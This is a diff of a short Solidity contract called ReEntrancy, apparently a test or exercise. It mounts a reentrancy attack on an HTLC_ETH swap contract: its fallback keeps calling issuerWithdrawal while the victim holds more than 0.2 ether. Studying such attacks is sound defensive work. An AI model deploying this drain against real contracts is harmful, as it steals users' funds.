@@ -7,32 +7,41 @@ contract ReEntrancy {
 
     HTLC_ETH htlcEth;
 
-    bytes32 private id;
-    bytes32 private secret;
+    bytes32 id;
+    bytes32 secret;
 
     constructor(address _htlcEthAddress) {
 
         htlcEth = HTLC_ETH(_htlcEthAddress);
     }
 
+    //  contract recieving ether should have a fallback or receive function but payable
+    event tes(address me);
+
+
     fallback() external payable {
-        
-        if (address(htlcEth).balance >= 0.1 ether) {
+
+
+        if(address(htlcEth).balance > 0.2 ether) {
 
             htlcEth.issuerWithdrawal(id, secret);
 
         }
+          
     }
 
     
 
     function attack(bytes32 _swapID, bytes32 _secretKey) external {
-
         id = _swapID;
         secret = _secretKey;
-        
+
         htlcEth.issuerWithdrawal(_swapID, _secretKey);
 
+    }
+
+    function re() external view returns (uint256) {
+        return address(this).balance;
     }
  
 }
